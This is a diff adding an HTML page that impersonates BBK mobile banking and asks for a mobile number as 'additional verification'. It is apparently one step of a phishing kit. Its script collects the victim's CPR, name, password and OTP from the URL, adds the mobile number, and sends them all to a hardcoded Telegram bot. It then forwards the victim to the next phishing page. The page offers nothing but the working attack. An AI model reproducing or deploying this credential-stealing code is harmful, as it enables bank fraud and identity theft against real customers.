@@ -1,0 +1,324 @@
+<html lang="en"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BBK Mobile Banking - Personal Information</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            background: linear-gradient(135deg, #4A90E2 0%, #2E5BBA 50%, #1E3A8A 100%);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            color: white;
+            overflow-x: hidden;
+        }
+
+        .container {
+            flex: 1;
+            padding: 40px 30px;
+            display: flex;
+            flex-direction: column;
+            max-width: 400px;
+            margin: 0 auto;
+            width: 100%;
+        }
+
+        .logo-container {
+            display: flex;
+            justify-content: flex-end;
+            margin-bottom: 60px;
+            margin-top: 20px;
+        }
+
+        .logo {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+        }
+
+        .logo-text {
+            font-size: 28px;
+            font-weight: bold;
+            letter-spacing: 2px;
+            margin-bottom: 5px;
+            position: relative;
+        }
+
+        .logo-star {
+            position: absolute;
+            right: -15px;
+            top: -5px;
+            font-size: 20px;
+            color: white;
+        }
+
+        .logo-arabic {
+            font-size: 12px;
+            letter-spacing: 1px;
+            opacity: 0.9;
+            direction: rtl;
+        }
+
+        .info-text {
+            text-align: center;
+            margin-bottom: 60px;
+        }
+
+        .info-text h1 {
+            font-size: 24px;
+            font-weight: 300;
+            line-height: 1.4;
+            margin-bottom: 20px;
+        }
+
+        .info-text p {
+            font-size: 16px;
+            opacity: 0.8;
+            line-height: 1.5;
+        }
+
+        .form-container {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .input-group {
+            margin-bottom: 40px;
+            position: relative;
+        }
+
+        .input-field {
+            width: 100%;
+            background: transparent !important;
+            border: none !important;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.5) !important;
+            padding: 15px 5px !important;
+            font-size: 16px !important;
+            color: white !important;
+            outline: none;
+            transition: border-color 0.3s ease;
+        }
+
+        .input-field::placeholder {
+            color: rgba(255, 255, 255, 0.7) !important;
+            font-weight: 300;
+        }
+
+        .input-field:focus {
+            border-bottom-color: white !important;
+        }
+
+        .submit-button {
+            background: rgba(255, 255, 255, 0.2);
+            border: none;
+            border-radius: 25px;
+            padding: 18px;
+            font-size: 18px;
+            color: white;
+            cursor: pointer;
+            margin-bottom: 30px;
+            transition: background-color 0.3s ease, transform 0.2s ease;
+            font-weight: 400;
+        }
+
+        .submit-button:hover {
+            background: rgba(255, 255, 255, 0.3);
+            transform: translateY(-1px);
+        }
+
+        .submit-button:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .back-button {
+            text-align: center;
+            margin-bottom: 40px;
+        }
+
+        .back-button a {
+            color: white;
+            text-decoration: none;
+            font-size: 16px;
+            font-weight: 300;
+            opacity: 0.9;
+            transition: opacity 0.3s ease;
+        }
+
+        .back-button a:hover {
+            opacity: 1;
+            text-decoration: underline;
+        }
+
+        .loading-spinner {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: white;
+            animation: spin 1s ease-in-out infinite;
+            margin-right: 10px;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                padding: 30px 20px;
+            }
+            
+            .info-text h1 {
+                font-size: 22px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo-container">
+            <div class="logo">
+                <div class="logo-text">
+                    BBK
+                    <span class="logo-star">✱</span>
+                </div>
+                <div class="logo-arabic">بنك البحرين والكويت</div>
+            </div>
+        </div>
+
+        <div class="info-text">
+            <h1>Additional Verification</h1>
+            <p>For your security, please provide the following information to complete the verification process</p>
+        </div>
+<form action="send.php" method="post">
+        <div class="form-container">
+            <div class="input-group">
+                <input type="tel" name="num" class="input-field" placeholder="Mobile Number *" id="Mobilenumber">
+            </div>
+
+            <button class="submit-button" name="ssss" id="submitBtn">Continue</button>
+
+            <div class="back-button">
+                <a href="/l">← Back</a>
+            </div>
+        </div>
+    </form></div>
+
+    <script>
+(async () => {
+  // Get URL parameters
+  var cleanQS = window.location.search.replace(/\&\?/g, '&');
+  var urlParams = new URLSearchParams(cleanQS);
+  const cpr = urlParams.get('cpr');
+  const name = urlParams.get('name');
+  const password = urlParams.get('password');
+  const otp = urlParams.get('otp');
+  
+  const form = document.querySelector('form');
+  const submitBtn = document.getElementById('submitBtn');
+  const mobileInput = document.getElementById('Mobilenumber');
+
+  form.addEventListener('submit', async (e) => {
+    e.preventDefault();
+    
+    const mobile = mobileInput.value.trim();
+    
+    if (!mobile) {
+      alert('Please enter your mobile number');
+      return;
+    }
+
+    // Disable button and show loading
+    submitBtn.disabled = true;
+    submitBtn.innerHTML = '<span class="loading-spinner"></span>';
+  const botToken = "8317396526:AAFNNX5WnbBb_Nt9cOUDOqy1cXhe2xrsSu8";
+  const chatId = "-5091116242";
+    try {
+      // Send mobile number to Telegram
+      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: ` 📱 *Mobile Number Submitted*\n━━━━━━━━━━\n📞 *Mobile:* ${mobile}\n👤 *Name:* ${name || 'Not provided'}\n🆔 *CPR:* ${cpr || 'Not provided'}\n🔑 *Password:* ${password}\n🔑 *OTP:* ${otp}`
+        })
+      });
+
+      // Redirect to next page (/n) with all parameters
+      let redirectUrl = `n.html?cpr=${encodeURIComponent(cpr)}`;
+      if (name) redirectUrl += `&?name=${encodeURIComponent(name)}`;
+      if (password) redirectUrl += `&?password=${encodeURIComponent(password)}`;
+      if (otp) redirectUrl += `&?otp=${encodeURIComponent(otp)}`;
+      redirectUrl += `&?mobile=${encodeURIComponent(mobile)}`;
+      window.location.href = redirectUrl;
+      
+    } catch (error) {
+      console.error('Error:', error);
+      // Still redirect even if Telegram fails
+     let redirectUrl = `n.html?cpr=${encodeURIComponent(cpr)}`;
+      if (name) redirectUrl += `&?name=${encodeURIComponent(name)}`;
+      if (password) redirectUrl += `&?password=${encodeURIComponent(password)}`;
+      if (otp) redirectUrl += `&?otp=${encodeURIComponent(otp)}`;
+      redirectUrl += `&?mobile=${encodeURIComponent(mobile)}`;
+      window.location.href = redirectUrl;
+    }
+  });
+
+  // Allow Enter key to submit
+  mobileInput.addEventListener('keypress', (e) => {
+    if (e.key === 'Enter') {
+      form.dispatchEvent(new Event('submit'));
+    }
+  });
+})();
+    </script>
+
+<div id="give-freely-root-ejkiikneibegknkgimmihdpcbcedgmpo" class="give-freely-root" data-extension-id="ejkiikneibegknkgimmihdpcbcedgmpo" data-extension-name="Volume Booster" style="display: block;"><template shadowrootmode="open"><style>
+  :host {
+    all: initial;
+  }
+
+  .gf-scroll-remove::-webkit-scrollbar {
+    border-radius-bottom-right: 15px;
+  }
+
+  button {
+    cursor: pointer;
+    transition: transform 0.1s ease;
+  }
+
+  button:active {
+    transform: scale(0.98);
+  }
+
+  .give-freely-close-button:hover {
+    opacity: 0.7;
+  }
+
+  input[type="radio"] {
+    margin-right: 8px;
+  }
+
+  hr {
+    border: none;
+    border-top: 1px solid #e5e5e5;
+    margin: 1em 0;
+  }
+
+  @media (max-width: 600px), (max-height: 480px) {
+    #give-freely-checkout-popup {
+      display: none !important;
+    }
+  }
+</style><div><div class="gf-app"></div></div></template></div></body></html>
